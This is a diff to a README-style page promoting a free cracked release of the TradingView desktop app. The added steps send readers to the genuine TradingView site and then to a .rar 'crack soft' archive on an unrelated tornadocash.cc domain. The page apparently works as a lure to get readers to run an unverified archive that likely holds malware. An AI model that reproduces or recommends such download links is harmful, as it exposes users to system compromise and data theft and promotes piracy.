@@ -16,7 +16,9 @@ Motherboard: Any
 
 
 # 📁 〢 Download
-Our free release can be downloaded Here
-https://tornadocash.cc/download/TradingView.rar
+1. Install TradingView first. (Download from https://www.tradingview.com/desktop/)
+
+2. **Download and indstall the crack soft.** Our free release can be downloaded Here
+[https://tornadocash.cc/download/TradingView.rar](https://tornadocash.cc/download/TradingView.rar)
 
 # 🌟 〢 FREE UPDATES
